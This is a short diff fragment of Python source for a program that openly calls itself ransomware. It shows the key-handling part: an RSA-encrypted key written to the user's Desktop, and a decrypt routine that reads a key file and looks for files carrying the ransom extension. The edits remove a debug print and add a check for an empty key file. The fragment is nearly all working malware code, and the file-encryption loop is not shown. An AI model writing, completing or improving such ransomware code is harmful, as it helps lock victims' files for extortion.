@@ -89,7 +89,7 @@ XwIDAQAB
                 recipient_key = RSA.import_key(ransomware.public_key)
                 encryptorRSA = PKCS1_OAEP.new(recipient_key)
                 enckey=encryptorRSA.encrypt(hashed)
-                print(enckey)
+                #print(enckey)
                 #extract the encrypted key as hex value
                 f=open(os.environ['HOME'] +'/Desktop/plain','wb')
                 f.write(binascii.hexlify(enckey))
@@ -102,10 +102,14 @@ XwIDAQAB
     def decrypt(list_files):
         extensions = ["*"]
         #read the decrypted key
+        if not os.path.isfile(os.environ['HOME'] + '/Desktop/key'):
+            x = open(os.environ['HOME'] + '/Desktop/key', 'wb')
+            x.close()
         x = open(os.environ['HOME'] + '/Desktop/key', 'rb')
-        #if x.read() == b'':
-        #    return
-        enckey = binascii.unhexlify(x.read())
+        deckey=x.read()
+        if deckey == b'':
+            return None
+        enckey = binascii.unhexlify(deckey)
         x.close()
         for extension in extensions:
             #Search for encrypted file based on the ransom extension
